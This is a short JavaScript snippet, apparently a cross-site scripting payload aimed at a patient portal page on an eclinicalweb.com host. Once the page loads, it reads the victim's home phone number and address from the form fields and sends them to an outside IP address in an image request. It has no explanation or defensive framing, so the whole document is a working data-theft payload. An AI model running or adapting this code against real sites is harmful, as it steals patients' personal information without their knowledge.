var req = new XMLHttpRequest();

req.onreadystatechange = function () {
if (req.readyState == 4 && req.status == 200 )
 {
 
 var phoneno = document.getElementById("con1_homephone").value;
 
 var address = document.getElementById("addi_address1").value;
 
 new Image().src = "https://172.105.54.23:443/?address="+address+"&phoneno"+phoneno;

 }
};

req.open("GET", "https://appsecpatientportal.eclinicalweb.com/appsec/jsp/jspnew/additionalInfo_New.jsp", true);
req.send();
